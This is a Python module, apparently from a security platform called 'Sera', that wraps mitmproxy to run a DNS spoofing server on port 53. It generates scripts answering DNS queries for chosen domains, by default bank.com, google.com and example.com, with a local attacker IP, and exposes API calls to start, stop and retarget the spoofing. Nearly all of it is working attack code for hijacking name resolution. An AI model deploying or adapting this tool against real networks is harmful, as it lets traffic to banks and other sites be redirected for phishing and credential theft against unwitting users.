#!/usr/bin/env python3
"""
dns_spoof.py - DNS spoofing with mitmproxy
MERGED FROM JULIUS → SERA PLATFORM
"""

import subprocess
import logging
import json
import sys
import os
from datetime import datetime
from typing import Optional, Dict, Any
from pathlib import Path

# Add Sera paths
SERA_ROOT = Path(__file__).parent.parent.parent
sys.path.insert(0, str(SERA_ROOT))

# Sera-specific imports
try:
    from config import settings
    SERA_CONFIG = settings
except ImportError:
    SERA_CONFIG = None

# Setup Sera logging
LOG_DIR = SERA_ROOT / "logs"
LOG_DIR.mkdir(exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_DIR / 'sera_dns_spoof.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("sera_dns_spoof")

# DNS Spoof Script Template
DNS_SPOOF_SCRIPT = """
from mitmproxy import dns

def request(flow: dns.DNSFlow) -> None:
    if flow.request and flow.request.question:
        qname = flow.request.question.name
        spoofed_domains = {
            b"example.com.": "192.168.1.100",
            b"bank.com.": "192.168.1.100",
            b"google.com.": "192.168.1.100",
        }
        if qname in spoofed_domains:
            flow.response = dns.make_response(flow.request)
            flow.response.answer = [
                dns.RR(qname, "A", 300, spoofed_domains[qname])
            ]
"""

class SeraDNSSpoofer:
    """DNS spoofing with Sera integration"""
    
    def __init__(self):
        self.is_running = False
        self.spoof_process = None
        self.spoofed_domains = {}
        self.spoof_history = []
        
        # Sera components
        self.db = self._init_database()
        self.auth = self._init_auth()
        self.audit = self._init_audit()
        
        # Default spoof domains
        self.spoofed_domains = {
            "example.com": "192.168.1.100",
            "bank.com": "192.168.1.100",
            "google.com": "192.168.1.100",
        }
        
        logger.info("Sera DNS Spoofer initialized")
    
    def _init_database(self):
        """Initialize Sera database"""
        try:
            from database.db import get_db
            return get_db()
        except ImportError:
            logger.warning("Database not available - using memory storage")
            return None
    
    def _init_auth(self):
        """Initialize Sera authentication"""
        try:
            from security.auth import get_current_user
            return get_current_user
        except ImportError:
            logger.warning("Auth not available - development mode")
            return None
    
    def _init_audit(self):
        """Initialize Sera audit logging"""
        try:
            from services.audit_service import log_activity
            return log_activity
        except ImportError:
            logger.warning("Audit service not available - using local logging")
            return None
    
    def set_spoofed_domains(self, domains: Dict[str, str]):
        """Set domains to spoof and their target IPs"""
        self.spoofed_domains.update(domains)
        logger.info(f"Updated spoofed domains: {list(domains.keys())}")
    
    def _generate_spoof_script(self) -> str:
        """Generate mitmproxy script with current domains"""
        domains_str = ",\n".join([
            f'            b"{domain}.": "{ip}",'
            for domain, ip in self.spoofed_domains.items()
        ])
        
        script = f"""
from mitmproxy import dns

def request(flow: dns.DNSFlow) -> None:
    if flow.request and flow.request.question:
        qname = flow.request.question.name
        spoofed_domains = {{
            {domains_str}
        }}
        if qname in spoofed_domains:
            flow.response = dns.make_response(flow.request)
            flow.response.answer = [
                dns.RR(qname, "A", 300, spoofed_domains[qname])
            ]
"""
        return script
    
    def start_dns_spoof(self, port: int = 53, 
                        interface: Optional[str] = None,
                        user_id: Optional[str] = None) -> Dict[str, Any]:
        """Start DNS spoofing"""
        if self.is_running:
            return {"success": False, "error": "DNS spoofing already running"}
        
        script_path = LOG_DIR / "dns_spoof_script.py"
        script_content = self._generate_spoof_script()
        
        with open(script_path, "w") as f:
            f.write(script_content)
        
        cmd = [
            "mitmproxy",
            "--mode", f"dns@:{port}",
            "-s", str(script_path),
            "--set", "dns_listen_address=0.0.0.0"
        ]
        
        if interface:
            cmd.extend(["--set", f"iface={interface}"])
        
        try:
            logger.info(f"Starting DNS spoofing on port {port}")
            self.is_running = True
            
            # Start in background
            import threading
            def run_spoof():
                subprocess.run(cmd)
                self.is_running = False
            
            thread = threading.Thread(target=run_spoof, daemon=True)
            thread.start()
            
            # Log audit
            spoof_info = {
                "port": port,
                "interface": interface,
                "domains_spoofed": list(self.spoofed_domains.keys()),
                "started_at": datetime.now().isoformat(),
                "user_id": user_id or "system"
            }
            self.spoof_history.append(spoof_info)
            self._log_dns_spoof(spoof_info)
            
            return {
                "success": True,
                "port": port,
                "domains_spoofed": len(self.spoofed_domains),
                "message": f"DNS spoofing started on port {port}"
            }
            
        except Exception as e:
            logger.error(f"Failed to start DNS spoofing: {e}")
            self.is_running = False
            return {"success": False, "error": str(e)}
    
    def stop_dns_spoof(self) -> Dict[str, Any]:
        """Stop DNS spoofing"""
        if not self.is_running:
            return {"success": False, "error": "DNS spoofing not running"}
        
        self.is_running = False
        
        # Kill mitmproxy processes
        try:
            subprocess.run(["pkill", "-f", "mitmproxy"], check=False)
            subprocess.run(["pkill", "-f", "mitmdump"], check=False)
            logger.info("DNS spoofing stopped")
        except Exception as e:
            logger.error(f"Error stopping DNS spoof: {e}")
        
        return {"success": True, "message": "DNS spoofing stopped"}
    
    def _log_dns_spoof(self, spoof_info: Dict[str, Any]):
        """Log DNS spoof to Sera audit"""
        try:
            if self.audit:
                self.audit(
                    action="dns_spoof_start",
                    target="all_domains",
                    details=spoof_info
                )
            else:
                audit_file = LOG_DIR / f"dns_spoof_{datetime.now().strftime('%Y%m%d')}.log"
                with open(audit_file, 'a') as f:
                    f.write(json.dumps(spoof_info) + '\n')
        except Exception as e:
            logger.error(f"Error logging DNS spoof: {e}")
    
    def get_status(self) -> Dict[str, Any]:
        """Get DNS spoofing status"""
        return {
            "is_running": self.is_running,
            "spoofed_domains": self.spoofed_domains,
            "total_spoofs": len(self.spoof_history)
        }

# Singleton
_spoofer_instance = None

def get_dns_spoofer() -> SeraDNSSpoofer:
    """Get or create DNS spoofer instance"""
    global _spoofer_instance
    if _spoofer_instance is None:
        _spoofer_instance = SeraDNSSpoofer()
    return _spoofer_instance

# Sera API Functions
def start_dns_spoof(port: int = 53, interface: Optional[str] = None,
                   user_id: Optional[str] = None) -> Dict[str, Any]:
    """API: Start DNS spoofing"""
    spoofer = get_dns_spoofer()
    return spoofer.start_dns_spoof(port, interface, user_id)

def stop_dns_spoof() -> Dict[str, Any]:
    """API: Stop DNS spoofing"""
    spoofer = get_dns_spoofer()
    return spoofer.stop_dns_spoof()

def set_spoof_domains(domains: Dict[str, str]) -> Dict[str, Any]:
    """API: Set domains to spoof"""
    spoofer = get_dns_spoofer()
    spoofer.set_spoofed_domains(domains)
    return {"status": "success", "domains": list(domains.keys())}

def get_dns_status() -> Dict[str, Any]:
    """API: Get DNS spoofing status"""
    spoofer = get_dns_spoofer()
    return {"status": "success", "data": spoofer.get_status()}

if __name__ == "__main__":
    print("Sera DNS Spoofer loaded")